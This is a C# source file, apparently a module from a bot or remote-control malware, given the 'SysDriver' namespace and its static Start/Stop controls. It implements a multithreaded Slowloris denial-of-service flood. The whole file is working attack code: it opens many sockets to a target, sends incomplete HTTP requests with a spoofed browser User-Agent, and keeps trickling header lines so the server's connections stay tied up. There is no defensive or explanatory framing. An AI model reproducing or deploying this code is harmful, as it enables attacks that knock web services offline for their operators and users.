using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace SysDriver;

public class nSlowlorisFlood
{
	private class SlowlorisRequest
	{
		private IPEndPoint IPEo;

		private Socket[] pSockets;

		private int iSockets;

		private int iTimeout;

		private volatile bool _shouldStop;

		public SlowlorisRequest(IPEndPoint tIPEo, int iSockets, int iTimeout)
		{
			IPEo = tIPEo;
			this.iSockets = iSockets;
			this.iTimeout = iTimeout;
		}

		public void RequestStop()
		{
			_shouldStop = true;
		}

		public void Send()
		{
			try
			{
				pSockets = new Socket[iSockets];
				while (!_shouldStop)
				{
					for (int i = 0; i < iSockets; i++)
					{
						if (pSockets[i] == null || !pSockets[i].Connected)
						{
							pSockets[i] = new Socket(IPEo.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
							pSockets[i].Connect(IPEo);
							string text = "";
							string s = string.Concat("GET /", text, " HTTP/1.1\r\nHost: ", IPEo.Address, "\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\nContent-Length: 42\r\n");
							byte[] bytes = Encoding.ASCII.GetBytes(s);
							pSockets[i].Send(bytes, bytes.Length, SocketFlags.None);
						}
					}
					for (int i = 0; i < iSockets; i++)
					{
						try
						{
							if (pSockets[i].Connected)
							{
								string s = "X-a: b\r\n";
								byte[] bytes = Encoding.ASCII.GetBytes(s);
								pSockets[i].Send(bytes, bytes.Length, SocketFlags.None);
							}
						}
						catch
						{
						}
					}
					Thread.Sleep(iTimeout * 1000);
				}
				for (int i = 0; i < iSockets; i++)
				{
					pSockets[i].Shutdown(SocketShutdown.Both);
					pSockets[i].Close();
				}
			}
			catch
			{
			}
		}
	}

	public static string sFHost;

	private static IPEndPoint IPEo;

	public static ushort uPort;

	public static int iThreads;

	public static int iSockets;

	public static int iTimeout = 30;

	private static ThreadStart[] tFloodingJob;

	private static Thread[] tFloodingThread;

	private static SlowlorisRequest[] SlowlorisClass;

	public static void Start()
	{
		try
		{
			IPEo = new IPEndPoint(Dns.GetHostEntry(sFHost).AddressList[0], uPort);
		}
		catch
		{
			IPEo = new IPEndPoint(IPAddress.Parse(sFHost), uPort);
		}
		tFloodingThread = new Thread[iThreads];
		tFloodingJob = new ThreadStart[iThreads];
		SlowlorisClass = new SlowlorisRequest[iThreads];
		for (int i = 0; i < iThreads; i++)
		{
			SlowlorisClass[i] = new SlowlorisRequest(IPEo, iSockets, iTimeout);
			tFloodingJob[i] = SlowlorisClass[i].Send;
			tFloodingThread[i] = new Thread(tFloodingJob[i]);
			tFloodingThread[i].Start();
		}
	}

	public static void Stop()
	{
		for (int i = 0; i < iThreads; i++)
		{
			try
			{
				SlowlorisClass[i].RequestStop();
				tFloodingThread[i].Join();
			}
			catch
			{
			}
		}
	}
}
